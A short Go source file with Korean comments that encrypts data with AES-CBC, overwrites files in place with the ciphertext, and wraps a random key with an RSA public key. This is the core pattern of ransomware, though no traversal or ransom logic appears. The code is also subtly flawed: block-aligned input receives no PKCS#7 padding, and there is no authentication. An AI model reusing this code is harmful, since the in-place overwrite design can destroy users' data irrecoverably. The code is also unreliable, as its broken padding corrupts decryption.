package encrypt

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"io"
	"os"
)

// EncryptAES 는 data를 AES와 CBC 블록 모드로 암호화
func EncryptAES(data, key []byte) ([]byte, error) {
	if len(string(data))%aes.BlockSize != 0 {
		data = PKCS7Padding(data, aes.BlockSize)
	}

	// 키에 대한 블록 생성
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// 암호문을 저장할 공간
	ciphertext := make([]byte, aes.BlockSize+len(data))
	// IV 초기화 벡터를 저장할 공간
	iv := ciphertext[:aes.BlockSize]

	//iv에 랜덤값 설정
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	// CBC 블록 모드
	mode := cipher.NewCBCEncrypter(block, iv)

	// 블록 암호화 수행
	mode.CryptBlocks(ciphertext[aes.BlockSize:], data)

	return ciphertext, nil
}

// EncryptFile 는 파일을 암호화 시킵니다
func EncryptFile(filename string, key []byte) error {
	// 파일 읽기
	data, err := os.ReadFile(filename)
	if err != nil {
		return err
	}

	// 파일 암호화
	encryptedData, err := EncryptAES(data, key)
	if err != nil {
		return err
	}

	// 암호화된 데이터로 파일 덮어쓰기
	err = os.WriteFile(filename, encryptedData, 0644)
	if err != nil {
		return err
	}

	return nil
}

// PKCS7Padding 는 PKCS#7 패딩 함수(CBC방식에 필요한)
func PKCS7Padding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize

	if padding == 0 {
		padding = blockSize
	}
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)

	return append(data, padtext...)
}

// EncryptRandomKeyWithPublicKey 는 난수로 생성한 키를  공개키로 암호화 시킵니다.
func EncryptRandomKeyWithPublicKey(randomKey []byte, publicKey *rsa.PublicKey) ([]byte, error) {

	//공개키로 암호화
	cipherKey, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, randomKey)
	if err != nil {
		return nil, err
	}

	return cipherKey, nil

}
